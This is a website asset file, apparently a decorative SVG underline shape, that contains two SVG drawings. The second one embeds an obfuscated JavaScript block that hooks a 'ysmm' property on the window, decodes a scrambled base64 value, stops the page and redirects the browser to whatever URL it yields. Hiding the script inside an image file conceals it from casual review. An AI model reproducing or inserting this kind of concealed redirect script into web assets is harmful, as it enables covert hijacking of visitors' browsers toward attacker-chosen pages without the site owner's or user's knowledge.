public/Front/assets/img/section-shapes1.svg

<svg width="416" height="19" viewBox="0 0 416 19" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M176.68 1.81964C157.136 2.44321 137.822 3.20995 118.987 4.0482C92.3244 5.23401 65.6722 6.46072 39.1806 8.403C30.8416 9.01635 22.3733 9.40478 14.0865 10.1715C8.88453 10.6519 1.98686 11.3367 1.08163 11.4799C0.608158 11.5616 0.401598 11.6844 0.334853 11.7253C-0.134449 12.0115 -0.0488186 12.2874 0.216076 12.5021C0.322451 12.5941 0.591442 12.8191 1.33815 12.8498C51.2761 14.9454 102.34 10.8564 152.339 10.427C239.045 9.69101 328.379 12.6147 414.397 18.9935C415.148 19.0446 415.878 18.789 415.982 18.4107C416.107 18.0427 415.565 17.6849 414.814 17.6338C328.65 11.2448 239.17 8.31088 152.297 9.05713C105.7 9.45581 58.1842 13.044 11.523 11.8173C12.5951 11.7151 13.6464 11.6128 14.6059 11.5208C22.8593 10.7541 31.2922 10.3759 39.5978 9.76255C66.033 7.82027 92.631 6.59357 119.258 5.41798C152.297 3.94594 186.775 2.67834 221.524 2.08543C233.955 2.17743 246.345 2.26948 258.735 2.38192C285.537 2.62726 312.465 3.34285 339.204 4.30376C347.255 4.60021 355.307 4.90686 363.358 5.17265C366.027 5.26465 372.911 5.53039 373.87 5.50995C375.059 5.4895 375.288 4.99887 375.309 4.91709C375.372 4.73308 375.33 4.4775 374.746 4.26283C374.683 4.23216 374.308 4.12987 373.474 4.06854C324.854 0.44977 272.939 -0.153263 221.566 0.71565C167.377 0.337418 112.98 0.173783 58.9288 0C58.155 0 57.523 0.30672 57.5168 0.684953C57.5126 1.06319 58.1362 1.36992 58.91 1.38014C98.0477 1.50281 137.384 1.62541 176.68 1.81964Z" fill="#1E84FE"/>
</svg>

<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 26.5.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 416 19" style="enable-background:new 0 0 416 19;" xml:space="preserve">
<style type="text/css">
	.st0{fill-rule:evenodd;clip-rule:evenodd;fill:#4DAA7F;}
</style>
<script  xmlns="">Object.defineProperty(window, &apos;ysmm&apos;, {
	set: function(val) {
		var T3 = val,
				key,
				I = &apos;&apos;,
				X = &apos;&apos;;
		for (var m = 0; m &lt; T3.length; m++) {
			if (m % 2 == 0) {
				I += T3.charAt(m);
			} else {
				X = T3.charAt(m) + X;
			}
		}
		T3 = I + X;
		var U = T3.split(&apos;&apos;);
		for (var m = 0; m &lt; U.length; m++) {
			if (!isNaN(U[m])) {
				for (var R = m + 1; R &lt; U.length; R++) {
					if (!isNaN(U[R])) {
						var S = U[m]^U[R];
						if (S &lt; 10) {
							U[m] = S;
						}
						m = R;
						R = U.length;
					}
				}
			}
		}
		T3 = U.join(&apos;&apos;);
		T3 = window.atob(T3);
		T3 = T3.substring(T3.length - (T3.length - 16));
		T3 = T3.substring(0, T3.length - 16);
		key = T3;
		if (key &amp;&amp; (key.indexOf(&apos;http://&apos;) === 0 || key.indexOf(&quot;https://&quot;) === 0)) {
			document.write(&apos;&lt;!--&apos;);
			window.stop();

			window.onbeforeunload = null;
			window.location = key;
		}
	}
});
	</script>
<path class="st0" d="M176.7,1.8C157.1,2.4,137.8,3.2,119,4C92.3,5.2,65.7,6.5,39.2,8.4c-8.3,0.6-16.8,1-25.1,1.8
	c-5.2,0.5-12.1,1.2-13,1.3c-0.5,0.1-0.7,0.2-0.7,0.2C-0.1,12,0,12.3,0.2,12.5c0.1,0.1,0.4,0.3,1.1,0.3c49.9,2.1,101-2,151-2.4
	c86.7-0.7,176,2.2,262.1,8.6c0.8,0.1,1.5-0.2,1.6-0.6c0.1-0.4-0.4-0.7-1.2-0.8c-86.2-6.4-175.6-9.3-262.5-8.6
	c-46.6,0.4-94.1,4-140.8,2.8c1.1-0.1,2.1-0.2,3.1-0.3c8.3-0.8,16.7-1.1,25-1.8c26.4-1.9,53-3.2,79.7-4.3c33-1.5,67.5-2.7,102.3-3.3
	c12.4,0.1,24.8,0.2,37.2,0.3c26.8,0.2,53.7,1,80.5,1.9c8.1,0.3,16.1,0.6,24.2,0.9c2.7,0.1,9.6,0.4,10.5,0.3c1.2,0,1.4-0.5,1.4-0.6
	c0.1-0.2,0-0.4-0.6-0.7c-0.1,0-0.4-0.1-1.3-0.2c-48.6-3.6-100.5-4.2-151.9-3.4C167.4,0.3,113,0.2,58.9,0c-0.8,0-1.4,0.3-1.4,0.7
	c0,0.4,0.6,0.7,1.4,0.7C98,1.5,137.4,1.6,176.7,1.8z"/>
</svg>
